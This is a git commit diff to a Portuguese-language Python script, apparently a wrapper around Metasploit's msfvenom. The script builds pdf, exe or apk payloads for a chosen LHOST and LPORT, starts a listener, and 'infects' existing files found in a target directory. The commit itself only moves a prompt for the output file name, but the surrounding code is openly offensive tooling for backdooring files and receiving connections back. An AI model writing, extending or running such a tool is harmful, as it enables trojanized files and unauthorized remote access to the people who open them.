892a573a74fb98078a95364ec5cc9f45ce903be9
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2023-11-03 22:47:27 -0300

    Atualizar o mymsfvenom.py

--- mymsfvenom.py
+++ mymsfvenom.py
@@ -20,10 +20,17 @@ def find_target_file(target_directory):
                 return os.path.join(root, file)
     return None
 
-def infect_existing_file(file_path, lhost, lport, output_name):
+def infect_existing_file(file_path, lhost, lport):
     if not file_path:
         print("Nenhum arquivo alvo encontrado no diretório especificado.")
         return
+
+    while True:
+        output_name = input("Insira o nome do arquivo de saída (output): ")
+        if not output_name:
+            print("Nome de saída inválido. Tente novamente.")
+        else:
+            break
 
     output_path = os.path.join(os.path.dirname(__file__), output_name)
     print(f"Infectando o arquivo {file_path} com payload para {lhost}:{lport} e salvando como {output_name}...")
@@ -46,13 +53,6 @@ def main():
             break
 
     while True:
-        output_name = input("Insira o nome do arquivo de saída (output): ")
-        if not output_name:
-            print("Nome de saída inválido. Tente novamente.")
-        else:
-            break
-
-    while True:
         print("Bem-vindo ao seu script de geração de payload e listener.")
         print("Selecione a opção desejada:")
         print("1. Gerar payload")
@@ -66,14 +66,14 @@ def main():
             payload_type = input("Escolha o tipo de payload (pdf/exe/apk): ")
             lhost = input(f"Insira o LHOST (padrão: {local_ip}): ") or local_ip
             lport = input("Insira o LPORT: ")
-            generate_payload(payload_type, lhost, lport, output_name)
+            generate_payload(payload_type, lhost, lport)
         elif option == "2":
             lhost = input(f"Insira o LHOST (padrão: {local_ip}): ") or local_ip
             lport = input("Insira o LPORT: ")
             start_listener(lhost, lport)
         elif option == "3":
             target_file = find_target_file(target_directory)
-            infect_existing_file(target_file, lhost, lport, output_name)
+            infect_existing_file(target_file, lhost, lport)
         elif option == "4":
             print("Encerrando o programa.")
             break
